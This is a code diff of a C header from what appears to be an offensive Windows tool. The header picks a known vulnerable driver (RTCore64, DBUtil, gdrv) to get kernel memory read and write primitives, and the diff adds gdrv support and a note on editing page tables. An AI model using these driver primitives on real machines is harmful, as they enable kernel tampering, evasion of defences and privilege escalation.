@@ -1,31 +1,34 @@
-/*
-
---- Kernel memory Read / Write primitives through the vulnerable Micro-Star MSI Afterburner driver.
---- Source and credit: https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp
-
-*/
-
 #pragma once
 
 #include <Windows.h>
 
 #define RTCore 0
 #define DBUtil 1
+#define GDRV 2
 // Select the driver to use with the following #define
-#define VULN_DRIVER RTCore
+#define VULN_DRIVER GDRV
 
+//TODO : design a way to make an atomic write given a non-atomic one
+//idea : modify a PTE to mark a page userland-reachable and perform the write from the process
 #if VULN_DRIVER == RTCore
 #define DEFAULT_DRIVER_FILE TEXT("RTCore64.sys")
 #define CloseDriverHandle CloseDriverHandle_RTCore
 #define ReadMemoryPrimitive ReadMemoryPrimitive_RTCore
 #define WriteMemoryPrimitive WriteMemoryPrimitive_RTCore
+#define WriteMemoryPrimitiveIsAtomic 0 //RTCore only allows to write up to a DWORD at a time
 #elif VULN_DRIVER == DBUtil
 #define DEFAULT_DRIVER_FILE TEXT("DBUtil_2_3.sys")
 #define CloseDriverHandle CloseDriverHandle_DBUtil
 #define ReadMemoryPrimitive ReadMemoryPrimitive_DBUtil
 #define WriteMemoryPrimitive WriteMemoryPrimitive_DBUtil
+#define WriteMemoryPrimitiveIsAtomic 1 //DBUtil allows to write an arbitrary size
+#elif VULN_DRIVER == GDRV
+#define DEFAULT_DRIVER_FILE TEXT("gdrv.sys")
+#define CloseDriverHandle CloseDriverHandle_GDRV
+#define ReadMemoryPrimitive ReadMemoryPrimitive_GDRV
+#define WriteMemoryPrimitive WriteMemoryPrimitive_GDRV
+#define WriteMemoryPrimitiveIsAtomic 1 //DBUtil allows to write an arbitrary size
 #endif
-
 
 BYTE    ReadMemoryBYTE(DWORD64 Address);
 WORD    ReadMemoryWORD(DWORD64 Address);
